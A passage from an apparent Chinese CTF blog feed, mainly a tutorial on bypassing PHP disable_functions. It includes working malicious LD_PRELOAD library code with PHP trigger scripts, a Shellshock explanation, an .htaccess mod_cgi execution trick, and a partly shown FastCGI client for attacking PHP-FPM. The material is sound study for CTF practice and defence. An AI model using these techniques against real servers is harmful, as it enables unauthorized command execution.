alt="在这里插入图片描述"><br>所以只需要两个key加密中ord出来的值一样就行了，到这就很简单了，直接构造如下，两个key长度不一样就行了，这样不管怎么样key[]数组取出来的永远是相同字母。</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">key1</span> = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<br><span class="hljs-attr">key2</span> = aaaaaaaaaaaaaaaaa<br></code></pre></div></td></tr></table></figure><p>直接输拿flag<br><img src="https://img-blog.csdnimg.cn/20210524135057598.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>TSCTF</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于disabled_function的绕过</title>
    <link href="/2021/05/17/2021-5-17-%E5%85%B3%E4%BA%8Edisabled_function%E7%9A%84%E7%BB%95%E8%BF%87/"/>
    <url>/2021/05/17/2021-5-17-%E5%85%B3%E4%BA%8Edisabled_function%E7%9A%84%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<p>最近做题遇到关于disabled_function的绕过，有时间来总结一下，博客顺序大致是按照ctfhub上的web进阶中关于disabled_fuction模块的学习顺序。</p><h3 id="绕过方式分类-大部分都可以用蚁剑插件直接进行，这里主要讲讲原理"><a href="#绕过方式分类-大部分都可以用蚁剑插件直接进行，这里主要讲讲原理" class="headerlink" title="绕过方式分类(大部分都可以用蚁剑插件直接进行，这里主要讲讲原理)"></a>绕过方式分类(大部分都可以用蚁剑插件直接进行，这里主要讲讲原理)</h3><h5 id="LD-PRELOAD利用-so文件环境变量加载指定的动态链接库，从而达到命令执行的目的"><a href="#LD-PRELOAD利用-so文件环境变量加载指定的动态链接库，从而达到命令执行的目的" class="headerlink" title="- LD_PRELOAD利用.so文件环境变量加载指定的动态链接库，从而达到命令执行的目的"></a>- LD_PRELOAD利用.so文件环境变量加载指定的动态链接库，从而达到命令执行的目的</h5><h5 id="CVE-2014-6271-Shellshock漏洞-bypass-disable-functions"><a href="#CVE-2014-6271-Shellshock漏洞-bypass-disable-functions" class="headerlink" title="- CVE-2014-6271 Shellshock漏洞 bypass disable_functions"></a>- CVE-2014-6271 Shellshock漏洞 bypass disable_functions</h5><h5 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="- Apache Mod CGI"></a>- Apache Mod CGI</h5><h5 id="攻击PHP-FPM绕过disable-funciton"><a href="#攻击PHP-FPM绕过disable-funciton" class="headerlink" title="- 攻击PHP_FPM绕过disable funciton"></a>- 攻击PHP_FPM绕过disable funciton</h5><h5 id="寻找未禁用的漏网函数，常见的执行命令的函数有-system-、exec-、shell-exec-、passthru-，偏僻的-popen-、proc-open-、pcntl-exec"><a href="#寻找未禁用的漏网函数，常见的执行命令的函数有-system-、exec-、shell-exec-、passthru-，偏僻的-popen-、proc-open-、pcntl-exec" class="headerlink" title="- 寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()"></a>- 寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()</h5><h5 id="UAF-释放重引用漏洞，例GC-UAF、Json-Serializer-UAF-漏洞、Backtrace-UAF等"><a href="#UAF-释放重引用漏洞，例GC-UAF、Json-Serializer-UAF-漏洞、Backtrace-UAF等" class="headerlink" title="- UAF 释放重引用漏洞，例GC UAF、Json Serializer UAF 漏洞、Backtrace UAF等"></a>- UAF 释放重引用漏洞，例GC UAF、Json Serializer UAF 漏洞、Backtrace UAF等</h5><h5 id="COM组件-条件：Windows、php5-x、支持COM组件"><a href="#COM组件-条件：Windows、php5-x、支持COM组件" class="headerlink" title="- COM组件 条件：Windows、php5.x、支持COM组件"></a>- COM组件 条件：Windows、php5.x、支持COM组件</h5><h5 id="FFI扩展"><a href="#FFI扩展" class="headerlink" title="- FFI扩展"></a>- FFI扩展</h5><h5 id="iconv绕过"><a href="#iconv绕过" class="headerlink" title="- iconv绕过"></a>- iconv绕过</h5><h2 id="关于LD-PRELOAD"><a href="#关于LD-PRELOAD" class="headerlink" title="关于LD_PRELOAD"></a>关于LD_PRELOAD</h2><p>在学习LD_PRELOAD之前需要了解什么是链接。</p><p>程序的链接主要有以下三种：</p><p>静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。<br>装入时动态链接：源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接。</p><p>运行时动态链接：原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。</p><p>对于动态链接来说，需要一个动态链接库，其作用在于当动态库中的函数发生变化对于可执行程序来说时透明的，可执行程序无需重新编译，方便程序的发布/维护/更新。但是由于程序是在运行时动态加载，这就存在一个问题，假如程序动态加载的函数是恶意的，就有可能导致disable_function被绕过。</p><h4 id="LD-PRELOAD的介绍"><a href="#LD-PRELOAD的介绍" class="headerlink" title="LD_PRELOAD的介绍"></a>LD_PRELOAD的介绍</h4><blockquote><p>在UNIX的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入恶意程序，从而达到那不可告人的罪恶的目的。</p></blockquote><h4 id="对LD-PRELOAD的利用"><a href="#对LD-PRELOAD的利用" class="headerlink" title="对LD_PRELOAD的利用"></a>对LD_PRELOAD的利用</h4><blockquote><p>前提： 能够上传.so文件到服务器后台，能够用putenv()等函数控制相应的环境变量，存在可以控制PHP启动外部程序的函数并能执行（因为新进程启动将加载LD_PRELOAD中的.so文件），比如mail()、imap_mail()、mb_send_mail()和error_log()等。<br>首先，我们能够上传恶意.so文件，.so文件由攻击者在本地使用与服务端相近的系统环境进行编译，该库中重写了相关系统函数，重写的系统函数能够被PHP中未被disable_functions禁止的函数所调用。</p></blockquote><p>当我们能够设置环境变量，比如putenv函数未被禁止，我们就可以把LD_PRELOAD变量设置为恶意.so文件的路径，只要启动新的进程就会在新进程运行前优先加载该恶意.so文件，由此，恶意代码就被注入到程序中</p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span> </span>&#123;<br>system(<span class="hljs-string">&quot;touch /var/www/html/success&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">seteuid</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br>unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>payload();<br>&#125;<br></code></pre></div></td></tr></table></figure><p>如果想创建一个动态链接库，可以使用 GCC 的-shared选项。输入文件可以是源文件、汇编文件或者目标文件。另外还得结合-fPIC选项。-fPIC 选项作用于编译阶段，告诉编译器产生与位置无关代码（Position-Independent Code）；这样一来，产生的代码中就没有绝对地址了，全部使用相对地址，所以代码可以被加载器加载到内存的任意位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的。你要根据目标架构编译成不同版本，在 x64 的环境中编译，若不带编译选项则默认为 x64，若要编译成 x86 架构需要加上 -m32 选项。</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">gcc -shared -fPIC <span class="hljs-keyword">test</span>.c -o test_x64.<span class="hljs-keyword">so</span><br></code></pre></div></td></tr></table></figure><p>使用该命令将.c文件编译成动态链接库.文件，并上传到/tmp上。</p><p>其实这里也有其他很多种代码，这里有一个通用化的代码。回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，比如geteuid（）。</p><p>在GCC 有个 C 语言扩展修饰符__attribute__((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行__attribute__((constructor))修饰的函数。</p><p><strong>attribute</strong>((destructor))中的destructor参数让系统在main()函数退出或者调用了exit()之后,(被__attribute__((destructor))修饰的函数)</p><p>因此，只要php中设置了LD_PRELOAD，并派生了新的进程，将会执行LD_PRELOAD的文件中<br><strong>attribute</strong>((constructor))里的函数</p><p>test3.c</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br>__attribute__((constructor))<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span> </span>&#123;<br>unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* cmd = getenv(<span class="hljs-string">&quot;CMD&quot;</span>);<br>system(cmd);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>test2.php</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>putenv(<span class="hljs-string">&quot;CMD=ls&quot;</span>);<br>putenv(<span class="hljs-string">&quot;LD_PRELOAD=./test3_x64.so&quot;</span>);<br>error_log(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h4><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>putenv(<span class="hljs-string">&quot;LD_PRELOAD=/var/www/html/test_x64.so&quot;</span>);<br>mail(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>error_log(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>将php代码上传到/var/www/html/1.php，接着访问1.php，查看/var/www/html会新建一个success文件。由此即可达到绕过disable_function<br>参考文章<br><a href="_url"></a><a href="http://www.52bug.cn/hkjs/6888.html">http://www.52bug.cn/hkjs/6888.html</a></p><h2 id="CVE-2014-6271-Shellshock漏洞-bypass-disable-functions（bash版本小于4-1）"><a href="#CVE-2014-6271-Shellshock漏洞-bypass-disable-functions（bash版本小于4-1）" class="headerlink" title="CVE-2014-6271 Shellshock漏洞 bypass disable_functions（bash版本小于4.1）"></a>CVE-2014-6271 Shellshock漏洞 bypass disable_functions（bash版本小于4.1）</h2><h4 id="介绍Shellshock漏洞"><a href="#介绍Shellshock漏洞" class="headerlink" title="介绍Shellshock漏洞"></a>介绍Shellshock漏洞</h4><blockquote><p>什么是SHELLSHOCK漏洞<br>Shellshock的原理是利用了Bash在导入环境变量函数时候的漏洞，启动Bash的时候，它不但会导入这个函数，而且也会把函数定义后面的命令执行。<br>在有些CGI脚本的设计中，数据是通过环境变量来传递的，这样就给了数据提供者利用Shellshock漏洞的机会。<br>简单来说就是由于服务器的cgi脚本调用了bash命令，由于bash版本过低，攻击者把有害数据写入环境变量，传到服务器端，触发服务器运行Bash脚本，完成攻击。</p></blockquote><h4 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h4><p>我们先来看一下这个漏洞形成的原因。这个问题的发生是因为Bash的一个功能，它允许在Bash的shell中使用环境变量来定义函数。<br>函数的作用是把经常调用的代码封装起来，然后在其他地方调用，所有的大多数脚本语言都有这个功能。<br>Bash中函数的定义是这样的:</p><figure class="highlight txt"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs txt">function ShellShock&#123;<br>   echo hello<br>&#125;<br>hello   #调用这个函数<br></code></pre></div></td></tr></table></figure><p>但是，Bash还有一种使用环境变量来定义函数的方法，这是它的特性。</p><p>如果环境变量的值以字符”() {“开头，那么这个变量就会被当作是一个导入函数的定义（Export），这种定义只有在shell启动的时候才生效.</p><figure class="highlight txt"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs txt">➜  ~ export ShellShock=&quot;() &#123; echo Hello ShellShock; &#125;&quot;<br>➜  ~ ShellShock<br>bash:ShellShock: command not found<br>➜  ~ bash<br>bash-4.1$ ShellShock<br>Hello ShellShock<br>bash-4.1$ <br></code></pre></div></td></tr></table></figure><p>基于此可以构造很多命令，可参考这两篇文章<br><a href="_url">_link</a><a href="https://www.freesion.com/article/28721177955/">https://www.freesion.com/article/28721177955/</a><br><a href="_url">_link</a><a href="https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/">https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/</a></p><h2 id="Apache-Mod-CGI绕过disable-function"><a href="#Apache-Mod-CGI绕过disable-function" class="headerlink" title="Apache Mod CGI绕过disable function"></a>Apache Mod CGI绕过disable function</h2><blockquote><p>利用条件：启用mod-cgi，允许htaccess文件，.htaccess可写</p></blockquote><h4 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h4><p>apache有一个cgi模块，该模块可以设置指定文件类型以cgi方式让服务器运行，例如一个不存在的afaafa后缀文件，通过设置，就可以当作cgi运行，因为是直接服务器运行的，所以可以绕过php的disable_functions限制。</p><p>任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中.</p><p>apache在配置cgi后可以用ScriptAlias指令指定一个目录,指定的目录下面便存放可执行的cgi程序.若是想要增加文件夹也可执行cgi程序,则可在apache主配置文件中做如下设置</p><p>先创建一个.a文件</p><figure class="highlight txt"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs txt">#!/bin/shecho&amp;id<br></code></pre></div></td></tr></table></figure><p>然后再建一个.htaccess文件，内容如下，意思是把.a文件当作cgi执行。</p><figure class="highlight txt"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs txt">OPtions + ExecCGI<br>AddHandler cgi-script .nbcgi-script .a<br></code></pre></div></td></tr></table></figure><h2 id="攻击PHP-FPM绕过disable-function"><a href="#攻击PHP-FPM绕过disable-function" class="headerlink" title="攻击PHP_FPM绕过disable function"></a>攻击PHP_FPM绕过disable function</h2><h4 id="PHP-FPM介绍"><a href="#PHP-FPM介绍" class="headerlink" title="PHP_FPM介绍"></a>PHP_FPM介绍</h4><p>Php-fpm是什么</p><blockquote><p>1、cgi、fast-cgi协议<br>cgi的历史<br>早期的webserver只处理html等静态文件，但是随着技术的发展，出现了像php等动态语言。webserver处理不了了，怎么办呢？那就交给php解释器来处理吧！交给php解释器处理很好，但是，php解释器如何与webserver进行通信呢？为了解决不同的语言解释器(如php、python解释器)与webserver的通信，于是出现了cgi协议。只要你按照cgi协议去编写程序，就能实现语言解释器与webwerver的通信。如php-cgi程序</p></blockquote><p>fast-cgi的改进</p><blockquote><p>有了cgi协议，解决了php解释器与webserver通信的问题，webserver终于可以处理动态语言了。但是，webserver每收到一个请求，都会去fork一个cgi进程，请求结束再kill掉这个进程。这样有10000个请求，就需要fork、kill php-cgi进程10000次。</p></blockquote><p>于是，出现了cgi的改良版本</p><blockquote><p>fast-cgi。fast-cgi每次处理完请求后，不会kill掉这个进程，而是保留这个进程，使这个进程可以一次处理多个请求。这样每次就不用重新fork一个进程了，大大提高了效率。</p></blockquote><p>所以</p><blockquote><p>php-fpm即php-Fastcgi Process Manager.php-fpm是 FastCGI 的实现，并提供了进程管理的功能。进程包含 master 进程和 worker 进程两种进程。master 进程只有一个，负责监听端口，接收来自 Web Server 的请求，而 worker 进程则一般有多个(具体数量根据实际需要配置)，每个进程内部都嵌入了一个 PHP 解释器，是 PHP 代码真正执行的地方。</p></blockquote><p>工作流程如图<br><img src="https://img-blog.csdnimg.cn/20210518122607155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="攻击PHP-FPM的原理"><a href="#攻击PHP-FPM的原理" class="headerlink" title="攻击PHP-FPM的原理"></a>攻击PHP-FPM的原理</h4><p>基本原理就是模仿nginx的fast-cgi，直接与php-fpm进行通信。<br><img src="https://img-blog.csdnimg.cn/20210518123521695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>requestId:占俩个字节，一个唯一的标志id，以避免同时处理多个请求时的影响。 </li><li>contentLength:占2个字节，表示body的长度。语言端解析了fastcgi头以后，拿到contentLength，然后再在TCP流里读取大小等于contentLength的数据，这就是body体。 </li><li>paddingLength:填充长度的值，为了提高处理消息的能力，我们的每个消息大小都必须为8的倍数，此长度标示，我们在消息的尾部填充的长度 </li><li>reserved:保留字段</li></ul><p>贴一下大佬得脚本</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> random<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FastCGIClient</span>:</span><br>    <span class="hljs-string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># 版本号，不重要</span><br>    __FCGI_VERSION = <span class="hljs-number">1</span><br><br>    <span class="hljs-comment"># FastCGI服务器角色及其设置</span><br>    __FCGI_ROLE_RESPONDER = <span class="hljs-number">1</span><br>    __FCGI_ROLE_AUTHORIZER = <span class="hljs-number">2</span><br>    __FCGI_ROLE_FILTER = <span class="hljs-number">3</span><br><br>    <span class="hljs-comment"># # type 记录类型1-11</span><br>    __FCGI_TYPE_BEGIN = <span class="hljs-number">1</span><br>    __FCGI_TYPE_ABORT = <span class="hljs-number">2</span><br>    __FCGI_TYPE_END = <span class="hljs-number">3</span><br>    __FCGI_TYPE_PARAMS = <span class="hljs-number">4</span><br>    __FCGI_TYPE_STDIN = <span class="hljs-number">5</span><br>    __FCGI_TYPE_STDOUT = <span class="hljs-number">6</span><br>    __FCGI_TYPE_STDERR = <span class="hljs-number">7</span><br>    __FCGI_TYPE_DATA = <span class="hljs-number">8</span><br>    __FCGI_TYPE_GETVALUES = <span class="hljs-number">9</span><br>    __FCGI_TYPE_GETVALUES_RESULT = <span class="hljs-number">10</span><br>    __FCGI_TYPE_UNKOWNTYPE = <span class="hljs-number">11</span><br><br>    <span class="hljs-comment"># 头部长度，默认为8</span><br>    __FCGI_HEADER_SIZE = <span class="hljs-number">8</span><br><br>    <span class="hljs-comment"># 自定义请求状态</span><br>    FCGI_STATE_SEND = <span class="hljs-number">1</span><br>    FCGI_STATE_ERROR = <span class="hljs-number">2</span><br>    FCGI_STATE_SUCCESS = <span class="hljs-number">3</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, host, port, timeout, keepalive</span>):</span><br>        self.host = host<br>        self.port = port<br>        self.timeout = timeout<br>        <span class="hljs-keyword">if</span> keepalive:<br>            self.keepalive = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            self.keepalive = <span class="hljs-number">0</span><br>        self.sock = <span class="hljs-literal">None</span><br>        self.requests = <span class="hljs-built_in">dict</span>()<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__connect</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-comment"># 此函数创建了一个socket，并且去连接(self.host, self.port)</span><br>        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        self.sock.settimeout(self.timeout)<br>        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">try</span>:<br>            self.sock.connect((self.host, <span class="hljs-built_in">int</span>(self.port)))<br>        <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> msg:<br>            self.sock.close()<br>            self.sock = <span class="hljs-literal">None</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">repr</span>(msg))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__encodeFastCGIRecord</span>(<span class="hljs-params">self, fcgi_type, content, requestid</span>):</span><br>        <span class="hljs-comment"># 此函数根据fcgi_type对content进行封装</span><br>        length = <span class="hljs-built_in">len</span>(content)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">chr</span>(FastCGIClient.__FCGI_VERSION) \<br>               + <span class="hljs-built_in">chr</span>(fcgi_type) \<br>               + <span class="hljs-built_in">chr</span>((requestid &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>               + <span class="hljs-built_in">chr</span>(requestid &amp; <span class="hljs-number">0xFF</span>) \<br>               + <span class="hljs-built_in">chr</span>((length &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>               + <span class="hljs-built_in">chr</span>(length &amp; <span class="hljs-number">0xFF</span>) \<br>               + <span class="hljs-built_in">chr</span>(<span class="hljs-number">0</span>) \<br>               + <span class="hljs-built_in">chr</span>(<span class="hljs-number">0</span>) \<br>               + content<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__encodeNameValueParams</span>(<span class="hljs-params">self, name, value</span>):</span><br>        <span class="hljs-comment"># 此函数对body进行编码</span><br>        nLen = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>(name))<br>        vLen = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>(value))<br>        record = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nLen &lt; <span 